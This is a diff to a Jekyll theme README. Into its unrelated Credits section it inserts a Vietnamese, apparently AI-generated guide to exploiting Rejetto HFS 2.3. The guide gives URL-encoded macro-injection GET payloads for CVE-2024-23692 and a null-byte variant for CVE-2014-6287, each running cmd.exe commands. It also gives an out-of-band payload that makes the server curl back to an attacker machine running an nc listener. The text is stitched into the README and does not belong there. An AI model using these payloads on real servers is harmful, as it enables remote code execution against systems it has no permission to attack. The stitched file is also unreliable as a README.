@@ -233,6 +233,68 @@ You can also contribute by becoming an [official sponsor](https://github.com/spo
 # Credits
 
 This template was not made *entirely* from scratch. I'd like to give special thanks to [Jekyll Now](https://github.com/barryclark/jekyll-now) and [Bootstrap Clean Blog](https://github.com/IronSummitMedia/startbootstrap-clean-blog), from whom I've taken several ideas initially.
+để tìm ra chính xác CVE dựa vào hành vi thực tế (Behavior-based/Black-box pentest) của máy chủ Rejetto HFS 2.3 trong môi trường lab mà không chỉ dựa vào việc quét phiên bản (Banner grabbing vốn dễ bị sai nếu admin đổi tên), bạn cần thực hiện theo quy trình thực nghiệm dưới đây.
+Phương pháp chính xác nhất là gửi payload kiểm thử không phá hủy (Non-destructive PoC) và quan sát phản hồi từ server (về mặt thời gian, mã lỗi, hoặc lưu lượng mạng).
+
+Bước 1: Xác định cấu trúc URL đặc trưng của HFS 2.x
+
+Trước khi khai thác, bạn cần xác nhận server mục tiêu thực sự chạy mã nguồn HFS 2.3 thông qua cấu trúc web:
+• Truy cập http://<IP_Server>:<Port>/
+• Xem Source Code (F12) tìm các chuỗi đặc trưng: href="http://rejetto.com", id="hfsmenu", hoặc các hàm JavaScript xử lý các macro như [box], [files].
+
+Bước 2: Pentest tìm CVE-2024-23692 (Template Injection RCE)
+
+Hành vi thực tế của lỗ hổng này là máy chủ sẽ thực thi cú pháp macro của HFS nằm trong URL hoặc tham số và trả về kết quả ngay trên giao diện web hoặc làm chậm tiến trình.
+Cách pentest chính xác nhất (Blind/Time-based hoặc Response-based):
+1. Sử dụng payload tính toán (Response-based):
+Gửi một yêu cầu HTTP GET với macro thực hiện phép tính để xem server có trả về kết quả không:http
+GET /?search==%7B%2B%7C1%7C1%7D HTTP/1.1
+Host: <IP_Server>
+Hãy thận trọng khi sử dụng mã.
+(Trong đó %7B%2B%7C1%7C1%7D là URL encode của {|+|1|1}).
+	• Hành vi xác nhận tổn thương: Nếu phản hồi từ server (HTTP Response) hiển thị số 2 ở vị trí tìm kiếm hoặc trong source code, server chắc chắn dính lỗ hổng này.
+2. Sử dụng lệnh trì hoãn (Time-based):
+Nếu cấu hình server ẩn kết quả, hãy ép server chạy lệnh ping hoặc sleep:http
+GET /?search=%7B.exec%7Cping%20-n%205%20127.0.0.1.%7D HTTP/1.1
+Host: <IP_Server>
+Hãy thận trọng khi sử dụng mã.
+
+	• Hành vi xác nhận tổn thương: Thời gian phản hồi từ server (Response Time) bị trễ khoảng 5 giây so với các request thông thường.
+
+Bước 3: Pentest tìm CVE-2014-6287 (Null Byte Parser Bypass RCE)
+
+Lỗ hổng này đặc trưng bởi việc bộ lọc của các phiên bản cũ bị bẻ gãy khi gặp ký tự Null Byte (%00).
+Cách pentest chính xác nhất:
+1. Gửi payload chèn macro thực thi lệnh thông qua tham số tìm kiếm kết hợp ký tự %00:http
+GET /?search=%00%7B.exec%7Ccmd.exe%20/c%20ping%20-n%205%20127.0.0.1.%7D HTTP/1.1
+Host: <IP_Server>
+Hãy thận trọng khi sử dụng mã.
+(Chuỗi chưa mã hóa là: /?search=%00{.exec|cmd.exe /c ping -n 5 127.0.0.1.})
+2. Hành vi xác nhận tổn thương:
+	• Máy chủ phản hồi trễ 5 giây.
+	• Nếu bạn bật Task Manager trên máy chủ lab (Windows), bạn sẽ thấy tiến trình cmd.exe và ping.exe được sinh ra dưới dạng tiến trình con của hfs.exe.
+
+Bước 4: Kiểm thử bằng phương thức Out-of-Band (OAST) - Khuyên dùng trong Lab
+
+Để xác định chuẩn xác nhất mà không cần nhìn vào màn hình server lab, hãy dựng một máy chủ lắng nghe (ví dụ: máy Kali Linux chạy nc -lvnp 4444 hoặc dùng Burp Suite Collaborator).
+1. Gửi payload bắt HFS kết nối ngược về máy bạn:http
+GET /?search=%7B.exec%7Ccmd.exe%20/c%20curl%20http://<IP_Kali>:<Port_nc>/%7D HTTP/1.1
+Hãy thận trọng khi sử dụng mã.
+2. Hành vi xác nhận: Nếu trên máy Kali nhận được một kết nối HTTP đến từ IP của server HFS, điều đó chứng tỏ lệnh RCE đã thực thi thành công hoàn toàn.
+
+Bảng đối chiếu hành vi thực tế để phân biệt 2 CVE
+
+
+Hành vi kiểm thử	Kết quả của CVE-2014-6287	Kết quả của CVE-2024-23692
+Gửi payload có %00 (Null byte)	Thành công (Lệnh thực thi)	Thành công (Do bản chất vẫn nhận macro)
+Gửi payload không có %00 (Chỉ có {...})	Thất bại (Bị bộ lọc chặn, trả về trang tìm kiếm rỗng)	Thành công (Vượt qua bộ lọc dễ dàng)
+
+Mẹo thu hẹp mục tiêu: Nếu bạn gửi payload không chứa %00 mà server vẫn thực thi lệnh (hoặc tính toán ra kết quả), server của bạn đang chạy phiên bản bị dính CVE-2024-23692 (phiên bản cao hơn như 2.3m). Nếu bắt buộc phải có %00 mới chạy được, server đang dính CVE-2014-6287 (phiên bản rất cũ < 2.3c).
+Để hỗ trợ bạn tốt nhất trong lab, bạn có thể cho tôi biết:
+• Bạn đang dùng công cụ nào để bắt và sửa gói tin (ví dụ: Burp Suite, Python script, hay Metasploit)?
+• Hệ điều hành của máy chủ HFS trong lab là Windows hay chạy qua Wine trên Linux?
+Từ đó tôi có thể cung cấp đoạn script test tự động hoặc câu lệnh chính xác cho môi trường của bạn.
+
 
 I'd also like to thank [Dr. Jekyll's Themes](https://drjekyllthemes.github.io/), [Jekyll Themes](http://jekyllthemes.org/), and another [Jekyll Themes](http://jekyllrc.github.io/jekyllthemes/) for featuring Beautiful Jekyll in their Jekyll theme directories.
 
